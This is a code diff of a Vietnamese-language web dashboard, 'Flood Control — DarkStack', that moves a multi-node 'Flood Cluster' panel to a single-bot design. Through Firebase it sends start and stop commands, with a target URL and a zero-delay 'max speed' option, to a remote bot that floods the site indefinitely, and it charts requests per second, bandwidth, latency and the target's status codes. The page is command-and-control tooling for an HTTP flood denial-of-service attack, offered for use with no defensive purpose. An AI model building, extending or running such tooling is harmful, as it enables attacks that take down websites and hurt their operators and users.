@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔥 Flood Cluster — DarkStack</title>
+<title>🔥 Flood Control — DarkStack</title>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
@@ -17,7 +17,7 @@
       radial-gradient(circle at 20% 10%, rgba(255,0,128,.08), transparent 40%),
       radial-gradient(circle at 80% 90%, rgba(0,200,255,.08), transparent 40%);
   }
-  .container { max-width: 1600px; margin: 0 auto; }
+  .container { max-width: 1400px; margin: 0 auto; }
   h1 {
     font-size: 28px; margin-bottom: 6px;
     background: linear-gradient(90deg,#ff3ea5,#00e5ff);
@@ -50,7 +50,7 @@
   .stat .value.yellow { color:#d29922; }
   .stat .value.cyan { color:#00e5ff; }
   .stat .value.magenta { color:#ff3ea5; }
-  .stat .value.big { font-size:32px; }
+  .stat .value.big { font-size:30px; }
 
   .status-row {
     display:flex; justify-content:space-between; align-items:center;
@@ -62,6 +62,7 @@
   }
   .status-badge.live { background:rgba(63,185,80,.15); color:#3fb950; border:1px solid rgba(63,185,80,.4); }
   .status-badge.idle { background:rgba(248,81,73,.15); color:#f85149; border:1px solid rgba(248,81,73,.4); }
+  .status-badge.wait { background:rgba(210,153,34,.15); color:#d29922; border:1px solid rgba(210,153,34,.4); }
   .dot { width:8px;height:8px;border-radius:50%;background:currentColor; animation:pulse 1.2s infinite; }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
 
@@ -99,23 +100,6 @@
   .hint { font-size:12px; color:#7d8590; margin-top:12px; line-height:1.7; }
   .chart-box { position:relative; height:250px; margin-top:10px; }
 
-  .node-card {
-    background: linear-gradient(135deg,#161b22,#0d1117);
-    border:1px solid #21262d; border-radius:10px; padding:14px;
-    display:flex; flex-direction:column; gap:8px;
-  }
-  .node-header { display:flex; justify-content:space-between; align-items:center; }
-  .node-id { font-weight:700; color:#00e5ff; font-size:13px; }
-  .node-status {
-    font-size:10px; padding:3px 8px; border-radius:10px;
-    background:rgba(63,185,80,.15); color:#3fb950; font-weight:600;
-  }
-  .node-status.off { background:rgba(248,81,73,.15); color:#f85149; }
-  .node-rps { font-size:24px; font-weight:700; color:#ff3ea5; }
-  .node-info { font-size:11px; color:#7d8590; display:flex; gap:10px; flex-wrap:wrap; }
-
-  .node-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:12px; }
-
   .toast {
     position:fixed; top:20px; right:20px; padding:14px 20px;
     background:#161b22; border:1px solid #30363d; border-left:4px solid #00e5ff;
@@ -132,36 +116,12 @@
 <body>
 
 <div class="container">
-  <h1>🔥 Flood Cluster — DarkStack</h1>
-  <div class="sub">Điều khiển TẤT CẢ các máy từ 1 giao diện • Gộp RPS từ mọi node</div>
-
-  <!-- TỔNG HỢP -->
-  <div class="card">
-    <div class="status-row">
-      <div>
-        <span class="status-badge idle" id="statusBadge">
-          <span class="dot"></span>
-          <span id="statusText">Đang kết nối Firebase...</span>
-        </span>
-      </div>
-      <div style="color:#7d8590; font-size:13px;" id="lastUpdate">—</div>
-    </div>
-
-    <div class="grid">
-      <div class="stat"><div class="label">🖥️ Nodes online</div><div class="value big cyan" id="tNodes">0</div></div>
-      <div class="stat"><div class="label">⚡ TỔNG RPS (giây)</div><div class="value big magenta" id="tRpsNow">0</div></div>
-      <div class="stat"><div class="label">🚀 TỔNG RPS (avg)</div><div class="value big magenta" id="tRpsAvg">0</div></div>
-      <div class="stat"><div class="label">📦 TỔNG requests</div><div class="value big" id="tTotal">0</div></div>
-      <div class="stat"><div class="label">✅ Thành công</div><div class="value big green" id="tSuccess">0</div></div>
-      <div class="stat"><div class="label">❌ Lỗi</div><div class="value big red" id="tErrors">0</div></div>
-      <div class="stat"><div class="label">📈 Tỉ lệ thành công</div><div class="value big green" id="tRate">0%</div></div>
-      <div class="stat"><div class="label">📦 Băng thông</div><div class="value big magenta" id="tBytes">0 B</div></div>
-    </div>
-  </div>
+  <h1>🔥 Flood Control — DarkStack</h1>
+  <div class="sub">Điều khiển bot từ xa qua Firebase • Single Machine Max Power</div>
 
   <!-- ĐIỀU KHIỂN -->
   <div class="card">
-    <h2>⚙️ Điều khiển TẤT CẢ các máy</h2>
+    <h2>⚙️ Bảng điều khiển</h2>
     <div class="input-row">
       <div style="flex:3;">
         <label>🔗 Link web cần flood</label>
@@ -171,35 +131,73 @@
         <label>⏳ Delay (0 = max speed)</label>
         <input id="delayInput" type="number" value="0" step="0.1" min="0" max="1">
       </div>
-      <button class="btn start" id="startBtn">▶️ START ALL</button>
-      <button class="btn stop" id="stopBtn" disabled>⏹ STOP ALL</button>
+      <button class="btn start" id="startBtn">▶️ START</button>
+      <button class="btn stop" id="stopBtn" disabled>⏹ STOP</button>
     </div>
     <div class="hint">
-      💡 Lệnh sẽ được gửi tới <b>TẤT CẢ các máy</b> đang online.<br>
-      🛑 Nhấn STOP để dừng toàn bộ cluster.<br>
-      ⚡ Delay = 0 để chạy MAX SPEED (không giới hạn tốc độ).
+      💡 Nhập link → bấm <b>START</b> → bot chạy <b>VÔ HẠN</b>.<br>
+      🛑 Bấm <b>STOP</b> để dừng bot.<br>
+      ⚡ Delay = 0 để chạy MAX SPEED.
+    </div>
+  </div>
+
+  <!-- TRẠNG THÁI -->
+  <div class="card">
+    <div class="status-row">
+      <div>
+        <span class="status-badge wait" id="statusBadge">
+          <span class="dot"></span>
+          <span id="statusText">Đang kết nối Firebase...</span>
+        </span>
+      </div>
+      <div style="color:#7d8590; font-size:13px;" id="lastUpdate">—</div>
+    </div>
+
+    <div class="grid">
+      <div class="stat"><div class="label">🔗 URL</div><div class="value cyan" id="sUrl" style="font-size:14px;">—</div></div>
+      <div class="stat"><div class="label">⏱ Thời gian chạy</div><div class="value magenta" id="sElapsed">0s</div></div>
+      <div class="stat"><div class="label">⚡ RPS hiện tại</div><div class="value big cyan" id="sRpsNow">0</div></div>
+      <div class="stat"><div class="label">🚀 RPS trung bình</div><div class="value big cyan" id="sRpsAvg">0</div></div>
+    </div>
+  </div>
+
+  <!-- SỐ LIỆU CHÍNH -->
+  <div class="card">
+    <h2>📊 Thống kê tổng quan</h2>
+    <div class="grid">
+      <div class="stat"><div class="label">📦 Tổng requests</div><div class="value" id="sTotal">0</div></div>
+      <div class="stat"><div class="label">✅ Thành công (2xx)</div><div class="value green" id="sSuccess">0</div></div>
+      <div class="stat"><div class="label">❌ Conn errors</div><div class="value red" id="sConnErr">0</div></div>
+      <div class="stat"><div class="label">⏛ Timeouts</div><div class="value yellow" id="sTimeout">0</div></div>
+      <div class="stat"><div class="label">⚠️ Lỗi khác</div><div class="value red" id="sOtherErr">0</div></div>
+      <div class="stat"><div class="label">📈 Tỉ lệ thành công</div><div class="value green" id="sSuccessRate">0%</div></div>
+      <div class="stat"><div class="label">📦 Băng thông</div><div class="value magenta" id="sBytes">0 B</div></div>
+      <div class="stat"><div class="label">🧵 Workers</div><div class="value yellow" id="sWorkers">0</div></div>
+    </div>
+  </div>
+
+  <!-- LATENCY -->
+  <div class="card">
+    <h2>⏱ Latency</h2>
+    <div class="grid">
+      <div class="stat"><div class="label">Trung bình</div><div class="value cyan" id="sLatAvg">0 ms</div></div>
+      <div class="stat"><div class="label">P50</div><div class="value cyan" id="sLatP50">0 ms</div></div>
+      <div class="stat"><div class="label">P95</div><div class="value yellow" id="sLatP95">0 ms</div></div>
+      <div class="stat"><div class="label">P99</div><div class="value red" id="sLatP99">0 ms</div></div>
+      <div class="stat"><div class="label">Min</div><div class="value green" id="sLatMin">0 ms</div></div>
+      <div class="stat"><div class="label">Max</div><div class="value red" id="sLatMax">0 ms</div></div>
     </div>
   </div>
 
   <!-- BIỂU ĐỒ -->
   <div class="card">
-    <h2>📈 TỔNG RPS theo thời gian (60s)</h2>
+    <h2>📈 RPS theo thời gian (60s gần nhất)</h2>
     <div class="chart-box"><canvas id="rpsChart"></canvas></div>
   </div>
 
-  <!-- NODES -->
+  <!-- STATUS CODES -->
   <div class="card">
-    <h2>🖥️ Danh sách các máy (Nodes)</h2>
-    <div class="node-grid" id="nodeGrid">
-      <div style="color:#7d8590; text-align:center; padding:20px; grid-column:1/-1;">
-        Chưa có node nào kết nối...
-      </div>
-    </div>
-  </div>
-
-  <!-- STATUS CODES TỔNG -->
-  <div class="card">
-    <h2>🎯 Status Codes (tổng hợp)</h2>
+    <h2>🎯 Status Codes</h2>
     <table>
       <thead>
         <tr><th>Code</th><th>Count</th><th>Phân bố</th></tr>
@@ -230,6 +228,14 @@ function fmtBytes(n) {
   while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
   return n.toFixed(1) + ' ' + u[i];
 }
+function fmtTime(s) {
+  s = Math.floor(s || 0);
+  if (s < 60) return s + 's';
+  const m = Math.floor(s / 60), r = s % 60;
+  if (m < 60) return m + 'm ' + r + 's';
+  const h = Math.floor(m / 60);
+  return h + 'h ' + (m % 60) + 'm';
+}
 function toast(msg, type='info') {
   const el = document.getElementById('toast');
   el.textContent = msg;
@@ -247,10 +253,10 @@ const rpsChart = new Chart(ctx, {
   data: {
     labels: [],
     datasets: [{
-      label: 'Tổng RPS',
+      label: 'RPS',
       data: [],
-      borderColor: '#ff3ea5',
-      backgroundColor: 'rgba(255,62,165,.15)',
+      borderColor: '#00e5ff',
+      backgroundColor: 'rgba(0,229,255,.15)',
       fill: true,
       tension: 0.3,
       pointRadius: 0,
@@ -270,133 +276,80 @@ const rpsChart = new Chart(ctx, {
 });
 
 // ============ STATE ============
-const nodes = {};       // id → data
-let totalPerSec = [];   // RPS tổng 60s
+let lastRunning = null;
 let lastCmdStatus = null;
 
-// ============ TỔNG HỢP ============
-function aggregate() {
-  const list = Object.values(nodes);
-  const now = Date.now();
-  const ONLINE_TIMEOUT = 15000; // 15s không update = offline
+// ============ UPDATE UI ============
+function updateUI(d) {
+  if (!d) return;
+  const isRunning = !!d.running;
 
-  let total = 0, success = 0, errors = 0, bytes = 0;
-  let rps_now = 0, rps_avg = 0, online = 0, running = 0;
-  const codes = {};
-  const combinedPerSec = new Array(60).fill(0);
-
-  for (const n of list) {
-    const isOnline = (now - (n.updated_at || 0)) < ONLINE_TIMEOUT;
-    if (isOnline) online++;
-    if (n.running && isOnline) running++;
-
-    total += n.total || 0;
-    success += n.success || 0;
-    errors += (n.conn_errors || 0) + (n.timeouts || 0) + (n.other_errors || 0);
-    bytes += n.bytes_total || 0;
-    rps_now += n.rps_now || 0;
-    rps_avg += n.rps_avg || 0;
-
-    const sc = n.status_codes || {};
-    for (const [k, v] of Object.entries(sc)) {
-      codes[k] = (codes[k] || 0) + v;
-    }
-
-    // Gộp per_second
-    const ps = n.per_second || [];
-    const offset = 60 - ps.length;
-    for (let i = 0; i < ps.length; i++) {
-      const idx = offset + i;
-      if (idx >= 0 && idx < 60) combinedPerSec[idx] += ps[i];
-    }
-  }
-
-  return {
-    total, success, errors, bytes,
-    rps_now, rps_avg, online, running,
-    codes, per_sec: combinedPerSec,
-    total_nodes: list.length
-  };
-}
-
-// ============ RENDER ============
-function render() {
-  const agg = aggregate();
-
-  // Status
+  // Badge
   const badge = document.getElementById('statusBadge');
   const text = document.getElementById('statusText');
-  if (agg.running > 0) {
+  if (isRunning) {
     badge.className = 'status-badge live';
-    text.textContent = `🟢 ĐANG CHẠY — ${agg.running}/${agg.total_nodes} nodes`;
-  } else if (agg.online > 0) {
+    text.textContent = '🟢 ĐANG CHẠY — MAX SPEED';
+  } else if ((d.total || 0) > 0) {
     badge.className = 'status-badge idle';
-    text.textContent = `⏸ IDLE — ${agg.online} nodes online, chờ lệnh`;
+    text.textContent = '🔴 ĐÃ DỪNG';
   } else {
-    badge.className = 'status-badge idle';
-    text.textContent = '⚫ Không có node nào online';
+    badge.className = 'status-badge wait';
+    text.textContent = '⏸ CHỜ LỆNH';
   }
 
-  document.getElementById('startBtn').disabled = agg.running > 0;
-  document.getElementById('stopBtn').disabled = agg.running === 0;
+  // Buttons
+  document.getElementById('startBtn').disabled = isRunning;
+  document.getElementById('stopBtn').disabled = !isRunning;
+
+  // Toast khi đổi trạng thái
+  if (lastRunning === null) lastRunning = isRunning;
+  else if (lastRunning !== isRunning) {
+    if (isRunning) toast('🚀 Bot đã bắt đầu!', 'success');
+    else toast('🛑 Bot đã dừng.', 'warn');
+    lastRunning = isRunning;
+  }
 
   document.getElementById('lastUpdate').textContent = '🕒 ' + new Date().toLocaleTimeString('vi-VN');
 
-  // Tổng
-  document.getElementById('tNodes').textContent = agg.online;
-  document.getElementById('tRpsNow').textContent = fmtNum(Math.round(agg.rps_now));
-  document.getElementById('tRpsAvg').textContent = fmtNum(Math.round(agg.rps_avg));
-  document.getElementById('tTotal').textContent = fmtNum(agg.total);
-  document.getElementById('tSuccess').textContent = fmtNum(agg.success);
-  document.getElementById('tErrors').textContent = fmtNum(agg.errors);
-  document.getElementById('tRate').textContent = agg.total > 0 ? (agg.success / agg.total * 100).toFixed(1) + '%' : '0%';
-  document.getElementById('tBytes').textContent = fmtBytes(agg.bytes);
+  // Top stats
+  document.getElementById('sUrl').textContent = d.url || '—';
+  document.getElementById('sElapsed').textContent = fmtTime(d.elapsed);
+  document.getElementById('sRpsNow').textContent = fmtNum(d.rps_now);
+  document.getElementById('sRpsAvg').textContent = fmtNum(Math.round(d.rps_avg || 0));
+
+  // Main stats
+  document.getElementById('sTotal').textContent = fmtNum(d.total);
+  document.getElementById('sSuccess').textContent = fmtNum(d.success);
+  document.getElementById('sConnErr').textContent = fmtNum(d.conn_errors);
+  document.getElementById('sTimeout').textContent = fmtNum(d.timeouts);
+  document.getElementById('sOtherErr').textContent = fmtNum(d.other_errors);
+  document.getElementById('sSuccessRate').textContent = (d.success_rate || 0).toFixed(1) + '%';
+  document.getElementById('sBytes').textContent = fmtBytes(d.bytes_total);
+  document.getElementById('sWorkers').textContent = (d.workers || 0) + ' × ' + fmtNum(d.concurrency || 0);
+
+  // Latency
+  document.getElementById('sLatAvg').textContent = (d.latency_avg_ms || 0).toFixed(1) + ' ms';
+  document.getElementById('sLatP50').textContent = (d.latency_p50_ms || 0).toFixed(1) + ' ms';
+  document.getElementById('sLatP95').textContent = (d.latency_p95_ms || 0).toFixed(1) + ' ms';
+  document.getElementById('sLatP99').textContent = (d.latency_p99_ms || 0).toFixed(1) + ' ms';
+  document.getElementById('sLatMin').textContent = (d.latency_min_ms || 0).toFixed(0) + ' ms';
+  document.getElementById('sLatMax').textContent = (d.latency_max_ms || 0).toFixed(0) + ' ms';
 
   // Chart
-  rpsChart.data.labels = agg.per_sec.map((_, i) => (60 - i) + 's');
-  rpsChart.data.datasets[0].data = agg.per_sec;
+  const ps = d.per_second || [];
+  rpsChart.data.labels = ps.map((_, i) => (ps.length - i) + 's');
+  rpsChart.data.datasets[0].data = ps;
   rpsChart.update('none');
-
-  // Nodes grid
-  const grid = document.getElementById('nodeGrid');
-  const now = Date.now();
-  const ONLINE_TIMEOUT = 15000;
-  const ids = Object.keys(nodes).sort();
-  if (ids.length === 0) {
-    grid.innerHTML = '<div style="color:#7d8590; text-align:center; padding:20px; grid-column:1/-1;">Chưa có node nào kết nối...</div>';
-  } else {
-    grid.innerHTML = ids.map(id => {
-      const n = nodes[id];
-      const isOnline = (now - (n.updated_at || 0)) < ONLINE_TIMEOUT;
-      const statusCls = isOnline && n.running ? '' : 'off';
-      const statusTxt = !isOnline ? 'OFFLINE' : (n.running ? 'RUNNING' : 'IDLE');
-      return `<div class="node-card">
-        <div class="node-header">
-          <span class="node-id">🖥️ ${id}</span>
-          <span class="node-status ${statusCls}">${statusTxt}</span>
-        </div>
-        <div class="node-rps">${fmtNum(Math.round(n.rps_now || 0))} <span style="font-size:12px; color:#7d8590;">RPS</span></div>
-        <div class="node-info">
-          <span>📦 ${fmtNum(n.total || 0)}</span>
-          <span>✅ ${fmtNum(n.success || 0)}</span>
-          <span>📈 ${(n.rps_avg || 0).toFixed(0)} avg</span>
-        </div>
-        <div class="node-info">
-          <span>💻 ${n.cpu || '?'} CPU</span>
-          <span>🧵 ${n.workers || '?'}W</span>
-          <span>⚙ ${n.concurrency || '?'}c</span>
-        </div>
-      </div>`;
-    }).join('');
-  }
 
   // Status codes
   const tbody = document.getElementById('statusBody');
-  const entries = Object.entries(agg.codes).sort((a, b) => b[1] - a[1]);
+  const codes = d.status_codes || {};
+  const entries = Object.entries(codes).sort((a, b) => b[1] - a[1]);
   if (entries.length === 0) {
     tbody.innerHTML = '<tr><td colspan="3" style="color:#7d8590; text-align:center;">Chưa có dữ liệu...</td></tr>';
   } else {
-    const totalC = entries.reduce((s, [, c]) => s + c, 0);
+    const total = entries.reduce((s, [, c]) => s + c, 0);
     tbody.innerHTML = entries.map(([code, cnt]) => {
       const c = parseInt(code);
       let color = '#f85149';
@@ -404,8 +357,8 @@ function render() {
       else if (c >= 300 && c < 400) color = '#d29922';
       else if (c >= 400 && c < 500) color = '#f85149';
       else if (c >= 500) color = '#ff3ea5';
-      const pct = (cnt / totalC * 100).toFixed(1);
-      const w = Math.max(2, cnt / totalC * 100);
+      const pct = (cnt / total * 100).toFixed(1);
+      const w = Math.max(2, cnt / total * 100);
       return `<tr>
         <td style="color:${color}; font-weight:700;">${code}</td>
         <td>${fmtNum(cnt)}</td>
@@ -416,37 +369,29 @@ function render() {
 }
 
 // ============ FIREBASE LISTENERS ============
-db.ref('nodes').on('value', (snap) => {
-  const data = snap.val() || {};
-  // Xoá node đã biến mất
-  for (const id of Object.keys(nodes)) {
-    if (!data[id] || !data[id].current) {
-      delete nodes[id];
-    }
+db.ref('current').on('value', (snap) => {
+  const d = snap.val();
+  if (d) updateUI(d);
+  else {
+    document.getElementById('statusText').textContent = '⏸ Chưa có dữ liệu từ bot';
   }
-  // Cập nhật
-  for (const [id, obj] of Object.entries(data)) {
-    if (obj && obj.current) {
-      nodes[id] = obj.current;
-    }
-  }
-  render();
+}, (err) => {
+  console.error('Firebase error:', err);
+  document.getElementById('statusText').textContent = '❌ Lỗi kết nối Firebase';
 });
 
 db.ref('command').on('value', (snap) => {
   const cmd = snap.val();
   if (!cmd) return;
-  const key = cmd.cmd_id + '|' + cmd.status;
+  const key = (cmd.cmd_id || '') + '|' + (cmd.status || '');
   if (key === lastCmdStatus) return;
   lastCmdStatus = key;
-  if (cmd.status === 'started') toast('✅ Tất cả nodes đã nhận lệnh START', 'success');
-  else if (cmd.status === 'stopped') toast('🛑 Tất cả nodes đã dừng', 'warn');
+  if (cmd.status === 'started') toast('✅ Bot đã nhận lệnh START', 'success');
+  else if (cmd.status === 'stopped') toast('🛑 Bot đã dừng', 'warn');
+  else if (cmd.status && cmd.status.startsWith('error')) toast('❌ ' + cmd.status, 'error');
 });
 
-// Render mỗi 1s để cập nhật offline status
-setInterval(render, 1000);
-
-// ============ START ALL ============
+// ============ START ============
 document.getElementById('startBtn').addEventListener('click', async () => {
   const url = document.getElementById('urlInput').value.trim();
   const delay = parseFloat(document.getElementById('delayInput').value) || 0;
@@ -460,12 +405,6 @@ document.getElementById('startBtn').addEventListener('click', async () => {
     return;
   }
 
-  const onlineNodes = Object.values(nodes).filter(n => (Date.now() - (n.updated_at||0)) < 15000).length;
-  if (onlineNodes === 0) {
-    toast('⚠️ Không có node nào online!', 'error');
-    return;
-  }
-
   try {
     await db.ref('command').set({
       action: 'start',
@@ -473,16 +412,16 @@ document.getElementById('startBtn').addEventListener('click', async () => {
       delay: delay,
       cmd_id: newCmdId(),
       status: 'pending',
-      created_at: Date.now(),
-      target_nodes: onlineNodes
+      created_at: Date.now()
     });
-    toast(`🚀 Đã gửi START tới ${onlineNodes} nodes`, 'success');
+    toast('🚀 Đã gửi lệnh START', 'success');
   } catch (e) {
-    toast('❌ Lỗi: ' + e.message, 'error');
+    console.error(e);
+    toast('❌ Lỗi gửi lệnh: ' + e.message, 'error');
   }
 });
 
-// ============ STOP ALL ============
+// ============ STOP ============
 document.getElementById('stopBtn').addEventListener('click', async () => {
   try {
     await db.ref('command').set({
@@ -491,17 +430,22 @@ document.getElementById('stopBtn').addEventListener('click', async () => {
       status: 'pending',
       created_at: Date.now()
     });
-    toast('🛑 Đã gửi lệnh STOP tới tất cả nodes', 'warn');
+    toast('🛑 Đã gửi lệnh STOP', 'warn');
   } catch (e) {
-    toast('❌ Lỗi: ' + e.message, 'error');
+    console.error(e);
+    toast('❌ Lỗi gửi lệnh: ' + e.message, 'error');
   }
 });
 
+// Enter để start
 document.getElementById('urlInput').addEventListener('keypress', (e) => {
   if (e.key === 'Enter') document.getElementById('startBtn').click();
 });
+document.getElementById('delayInput').addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') document.getElementById('startBtn').click();
+});
 
-console.log('🔥 Flood Cluster ready.');
+console.log('🔥 Flood Control ready.');
 </script>
 </body>
 </html>
